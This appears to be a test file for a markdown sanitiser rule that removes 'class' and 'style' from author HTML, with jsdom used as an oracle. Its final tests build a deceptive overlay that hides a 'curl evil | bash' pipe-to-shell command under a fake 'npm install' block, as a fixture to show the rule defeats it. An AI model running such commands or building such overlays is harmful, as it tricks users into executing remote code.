// The rule is "author raw HTML may carry neither `class` nor `style`", so
// these test BOTH directions: removed everywhere it must be, and every
// other byte untouched. A stripper that is too eager is a bug too — it
// would silently rewrite documents the app is only supposed to render.

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { JSDOM } from "jsdom";
import { Marked } from "marked";
import { stripPresentationAttributes, rawHtmlPolicyExtension } from "@mulmoclaude/markdown-utils/markdown/rawHtmlPolicy";

const dom = new JSDOM("<!doctype html><html><body></body></html>");
(globalThis as { window?: unknown; document?: unknown }).window = dom.window;
(globalThis as { window?: unknown; document?: unknown }).document = dom.window.document;

const { sanitizeMarkdownHtml } = await import("@mulmoclaude/core/plugin-vue");

describe("stripPresentationAttributes — removes", () => {
  const removed: { name: string; input: string; expected: string }[] = [
    { name: "double-quoted class", input: '<div class="absolute inset-0">x</div>', expected: "<div>x</div>" },
    { name: "single-quoted class", input: "<div class='absolute'>x</div>", expected: "<div>x</div>" },
    { name: "unquoted class", input: "<div class=absolute>x</div>", expected: "<div>x</div>" },
    { name: "style", input: '<pre style="position:absolute; inset:0">x</pre>', expected: "<pre>x</pre>" },
    { name: "both, keeping the rest", input: '<a href="/y" class="c" style="s" id="k">x</a>', expected: '<a href="/y" id="k">x</a>' },
    { name: "upper case names", input: '<div CLASS="c" STYLE="s">x</div>', expected: "<div>x</div>" },
    { name: "a bare valueless attribute", input: "<div class>x</div>", expected: "<div>x</div>" },
    // Whitespace around `=` is legal HTML and the scanner has to skip it on
    // BOTH sides. Without these, a mutation that stops skipping before the
    // `=` passes every other test while leaving `<div = "absolute">` behind —
    // malformed, and the value survives. (codex round 1, axis 1.)
    { name: "spaces around the equals sign", input: '<div class = "absolute">x</div>', expected: "<div>x</div>" },
    { name: "tabs around the equals sign", input: '<div style\t=\t"position:fixed">x</div>', expected: "<div>x</div>" },
    { name: "space before equals, unquoted value", input: "<div class = absolute>x</div>", expected: "<div>x</div>" },
    { name: "spaced equals with another attribute after", input: '<div class = "a" id="k">x</div>', expected: '<div id="k">x</div>' },
    { name: "a value containing >", input: '<div class="a>b" id="k">x</div>', expected: '<div id="k">x</div>' },
    { name: "every tag in the fragment", input: '<p class="a"><span style="b">x</span></p>', expected: "<p><span>x</span></p>" },
    { name: "a self-closing tag", input: '<img src="a.png" class="c"/>', expected: '<img src="a.png"/>' },
    // marked hands raw HTML over in chunks that are not well-formed, which
    // is exactly why this is lexical rather than a DOM round-trip.
    { name: "an unclosed opening tag on its own", input: '<div class="relative">', expected: "<div>" },
    // Attributes may be separated by ANY whitespace, newlines included.
    // A mutation narrowing the separator to `[ \t]+` passed all 27 other
    // tests (codex round 2, axis 3).
    { name: "a newline before the attribute", input: '<div\nclass="absolute">x</div>', expected: "<div>x</div>" },
    { name: "a newline-separated attribute among others", input: '<div\nid="k"\nclass="absolute">x</div>', expected: '<div\nid="k">x</div>' },
    // The element's OWN class still goes, only its CONTENT is spared.
    { name: "class on a raw-text element itself", input: '<textarea class="absolute">body</textarea>', expected: "<textarea>body</textarea>" },
    // The three spellings a real parser DOES accept as the end tag.
    { name: "close tag with trailing space", input: "<textarea>a</textarea ><div class=x>", expected: "<textarea>a</textarea ><div>" },
    { name: "close tag with a slash", input: "<textarea>a</textarea/><div class=x>", expected: "<textarea>a</textarea/><div>" },
    { name: "close tag in a different case", input: "<textarea>a</TEXTAREA><div class=x>", expected: "<textarea>a</TEXTAREA><div>" },
  ];
  removed.forEach(({ name, input, expected }) => {
    it(name, () => assert.equal(stripPresentationAttributes(input), expected));
  });
});

describe("stripPresentationAttributes — leaves alone", () => {
  const untouched: { name: string; input: string }[] = [
    { name: "a closing tag chunk", input: "</div>" },
    { name: "plain text", input: "just some prose" },
    { name: "a less-than in prose", input: "a < b and c > d" },
    { name: "an attribute merely starting with the name", input: '<div classname="c" data-class="d" data-style="e">x</div>' },
    { name: "a comment mentioning the attributes", input: '<!-- class="a" style="b" -->' },
    { name: "other attributes with odd spacing", input: "<div  id = \"k\"  data-x='v' >x</div>" },
    { name: "an empty fragment", input: "" },
    { name: "text that looks like a tag but is not", input: "3 <4 and 5< 6" },
    // Inside a raw-text element the parser reads CHARACTERS, not markup, so
    // rewriting them corrupts a document instead of protecting anyone.
    // `<textarea><div class=foo></textarea>` was coming out as
    // `<textarea><div></textarea>` (codex round 2).
    { name: "markup inside a textarea", input: "<textarea><div class=foo></textarea>" },
    { name: "markup inside an unclosed textarea", input: "<textarea>unclosed <div class=x>" },
    { name: "markup inside a title", input: "<title>a <b class=x> b</title>" },
    // HTML's "appropriate end tag": the name must be followed by whitespace,
    // `/` or `>`. `</textareax>` closes nothing — verified against jsdom,
    // where this textarea's VALUE is `keep </textareax><div class=foo>`. A
    // prefix match ended raw text early and stripped literal text that a
    // reader is meant to see (codex round 3).
    { name: "a close tag that only PREFIXES the name", input: "<textarea>keep </textareax><div class=foo></textarea>" },
  ];
  untouched.forEach(({ name, input }) => {
    it(name, () => assert.equal(stripPresentationAttributes(input), input));
  });
});

describe("the WHOLE contract, differentially against a real parser", () => {
  // Six of this PR's findings were bugs in the scanner, each a shape neither
  // reviewer had imagined the round before. Enumerating more spellings was
  // never going to end that, so this asserts the complete contract instead,
  // with a real parser as the oracle:
  //
  //   parsing strip(F) gives the SAME document as parsing F,
  //   except that no element has `class` or `style`.
  //
  // That is both halves at once — nothing forbidden survives, and nothing
  // else changes — and it is what catches the next shape rather than the
  // last one. It would have failed on the bogus-quote corruption, the
  // raw-text cases, the comment boundary and the slash bypass alike.
  const parse = (html: string): HTMLElement => new JSDOM(`<!doctype html><body>${html}</body>`).window.document.body;

  /** The input's document with the forbidden attributes removed — i.e. what
   *  the stripped output is required to be equal to. */
  const expectedShape = (html: string): string => {
    const body = parse(html);
    body.querySelectorAll("*").forEach((element) => {
      element.removeAttribute("class");
      element.removeAttribute("style");
    });
    return body.innerHTML;
  };

  const corpus: string[] = [
    // ordinary
    '<div class="absolute">x</div>',
    '<p><span class="a"><b style="b">x</b></span></p>',
    '<a href="/y" class="c" style="s" id="k">x</a>',
    // quoting oddities
    '<div class="a>b" id="k">x</div>',
    "<div a='x' class='y'>z</div>",
    '<div ">text class=x</div><span class=y>z</span>',
    "<div class=absolute>x</div>",
    '<div class = "absolute">x</div>',
    // separators the spec allows
    '<div\nclass="absolute">x</div>',
    '<div\tclass="absolute">x</div>',
    '<div /class="absolute">x</div>',
    "<div //class=absolute>x</div>",
    // self-closing must survive
    '<img src="a.png" class="c"/>',
    "<br/>",
    // raw text is characters, not markup
    "<textarea><div class=foo></textarea>",
    "<textarea>keep </textareax><div class=foo></textarea>",
    "<plaintext><div class=x></plaintext><span class=y>",
    // comments are verbatim
    "<!-- <div class=x> <span class=y> -->",
    "<!DOCTYPE html><div class=x>",
    // prose that merely looks like markup
    "a < b and c > d",
    "3 <4 and 5< 6",
    '<div classname="c" data-class="d" data-style="e">x</div>',
    // HTML whitespace is EXACTLY tab/LF/FF/CR/space. NBSP, vertical tab and
    // U+2028 are NOT separators, so `<div\u00a0class=x>` has no class
    // attribute at all and the scanner must leave it alone — it was
    // rewriting these to `<div>` (codex round 6).
    "<div\u00a0class=x>y</div>",
    "<div\u000bclass=x>y</div>",
    "<div\u2028class=x>y</div>",
    "<div\u000cclass=x>y</div>",
    "<div\rclass=x>y</div>",
  ];

  corpus.forEach((html) => {
    const label = html.replace(/\n/g, "\\n").replace(/\t/g, "\\t");
    it(`same document minus class/style — ${label}`, () => {
      assert.equal(parse(stripPresentationAttributes(html)).innerHTML, expectedShape(html));
    });
  });

  it("the oracle is not vacuous — an unstripped document does NOT match its own expected shape", () => {
    // If `expectedShape` silently returned its input, every case above would
    // pass no matter what the scanner did.
    const withAttrs = '<div class="absolute">x</div>';
    assert.notEqual(parse(withAttrs).innerHTML, expectedShape(withAttrs));
  });
});

describe("the RULE itself, differentially against a real parser", () => {
  // The boundary oracle below pins raw text. This one pins the actual
  // security property, and it exists because my hand-picked cases could
  // not have found what they did not imagine: `<div /class="absolute">`
  // reached the DOM as a real class, because HTML treats a `/` before an
  // attribute name as a separator and my matcher only accepted whitespace
  // (codex round 4, P1).
  //
  // So the assertion is not "these spellings are removed" — it is: after
  // stripping, NO element a real parser finds has either attribute,
  // whatever spelling was used.
  const survivingPresentationAttrs = (html: string): string[] => {
    const parsed = new JSDOM(`<!doctype html><body>${stripPresentationAttributes(html)}</body>`);
    const found: string[] = [];
    parsed.window.document.querySelectorAll("*").forEach((element) => {
      ["class", "style"].forEach((name) => {
        if (element.hasAttribute(name)) found.push(`${element.tagName.toLowerCase()}[${name}]`);
      });
    });
    return found;
  };

  const spellings: string[] = [
    '<div class="absolute">x</div>',
    "<div class=absolute>x</div>",
    "<div class='absolute'>x</div>",
    '<div CLASS="absolute">x</div>',
    '<div class = "absolute">x</div>',
    '<div\nclass="absolute">x</div>',
    '<div\tclass="absolute">x</div>',
    // The slash forms — HTML's before-attribute-name state accepts them.
    '<div /class="absolute">x</div>',
    '<div\n/class="absolute">x</div>',
    "<div //class=absolute>x</div>",
    '<div id="k" /class=z>x</div>',
    '<pre /style="position:fixed">x</pre>',
    '<div style="position:absolute" class="inset-0">x</div>',
    '<p><span class="a"><b style="b">x</b></span></p>',
  ];

  spellings.forEach((html) => {
    it(`no class or style survives — ${html.replace(/\n/g, "\\n").replace(/\t/g, "\\t")}`, () => {
      assert.deepEqual(survivingPresentationAttrs(html), []);
    });
  });

  it("the oracle is not vacuous — it sees the attributes when they are NOT stripped", () => {
    // A check that matches nothing passes just as well as one that works.
    const parsed = new JSDOM('<!doctype html><body><div class="absolute" style="x">y</div></body>');
    const element = parsed.window.document.querySelector("div");
    assert.ok(element);
    assert.ok(element.hasAttribute("class") && element.hasAttribute("style"));
  });
});

describe("raw-text boundaries, differentially against a real parser", () => {
  // Four of the findings on this scanner were raw-text boundary bugs, so the
  // hand-picked cases above get an ORACLE rather than more of my guesses:
  // whatever a real HTML parser considers raw text must come out of the
  // stripper unchanged. Deterministic and small on purpose — the point is a
  // boundary oracle for the axis that keeps producing findings, not a parser
  // conformance suite (codex round 3).
  const rawTextValue = (html: string, selector: string): string | null => {
    const parsed = new JSDOM(`<!doctype html><body>${html}</body>`);
    return parsed.window.document.querySelector(selector)?.textContent ?? null;
  };

  const cases: { name: string; input: string; selector: string }[] = [
    { name: "prefix that does not close", input: "<textarea>keep </textareax><div class=foo></textarea>", selector: "textarea" },
    { name: "close with trailing space", input: "<textarea>a</textarea ><div class=x>", selector: "textarea" },
    { name: "close with a slash", input: "<textarea>a</textarea/><div class=x>", selector: "textarea" },
    { name: "close in a different case", input: "<textarea>a</TEXTAREA><div class=x>", selector: "textarea" },
    { name: "no close tag at all", input: "<textarea>no close <div class=x>", selector: "textarea" },
    // `</plaintext>` closes nothing; the element runs to the end.
    { name: "plaintext consumes the rest", input: "<plaintext><div class=x></plaintext><span class=y>", selector: "plaintext" },
  ];

  cases.forEach(({ name, input, selector }) => {
    it(`what the parser calls raw text survives untouched — ${name}`, () => {
      const before = rawTextValue(input, selector);
      const after = rawTextValue(stripPresentationAttributes(input), selector);
      assert.notEqual(before, null, "the fixture must actually produce the element");
      assert.equal(after, before);
    });
  });

  it("a comment's contents survive, however many tag-looking things are in it", () => {
    // The `<!` branch used to stop at the FIRST `>`, so later comment text
    // got rewritten — not a security miss, but it broke the verbatim contract.
    const input = "<!-- <div class=x> <span class=y> -->";
    assert.equal(stripPresentationAttributes(input), input);
  });
});

describe("rawHtmlPolicyExtension through real marked + the real sanitiser", () => {
  const render = (source: string): string => {
    const marked = new Marked();
    marked.use(rawHtmlPolicyExtension);
    return sanitizeMarkdownHtml(marked.parse(source) as string);
  };

  // Both spellings of the same attack. `style` alone was the remedy the
  // issue proposed, and it would have left the second one working —
  // every utility it uses ships in the app's own stylesheet.
  it("neutralises the style-based overlay", () => {
    const html = render(
      [
        '<div style="position:relative">',
        "",
        "```sh",
        "curl evil | bash",
        "```",
        "",
        '<pre style="position:absolute; inset:0; background:white"><code>npm install</code></pre>',
        "</div>",
      ].join("\n"),
    );
    assert.doesNotMatch(html, /position:\s*absolute/);
    assert.doesNotMatch(html, /style=/);
    assert.match(html, /curl evil \| bash/);
  });

  it("neutralises the class-based overlay — no style attribute anywhere in it", () => {
    const source = [
      '<div class="relative">',
      "",
      "```sh",
      "curl evil | bash",
      "```",
      "",
      '<pre class="absolute inset-0 bg-white pointer-events-none"><code>npm install</code></pre>',
      "</div>",
    ].join("\n");
    assert.doesNotMatch(source, /style=/, "the payload must not rely on style, or it proves nothing");
    const html = render(source);
    assert.doesNotMatch(html, /class="absolute/);
    assert.doesNotMatch(html, /pointer-events-none/);
    assert.match(html, /curl evil \| bash/);
  });

  it("leaves the RENDERER's own classes alone — it never routes them through `html`", () => {
    // The whole reason the rule can be this blunt: highlight spans, the
    // copy button and mermaid placeholders come from other renderers.
    const html = render('```\nplain\n```\n\n<div class="absolute">author</div>');
    assert.match(html, /<pre>/);
    assert.doesNotMatch(html, /class="absolute"/);
  });

  it("strips around a raw-text element without touching what is inside it", () => {
    const html = render('<div class="absolute"><textarea><b class="c"></textarea></div>');
    assert.doesNotMatch(html, /class="absolute"/);
    assert.match(html, /&lt;b class="c"&gt;|&lt;b class=&quot;c&quot;&gt;/);
  });

  it("keeps structural author HTML working", () => {
    const html = render("<details><summary>More</summary>\n\nbody text\n\n</details>");
    assert.match(html, /<details>/);
    assert.match(html, /<summary>More<\/summary>/);
    assert.match(html, /body text/);
  });
});
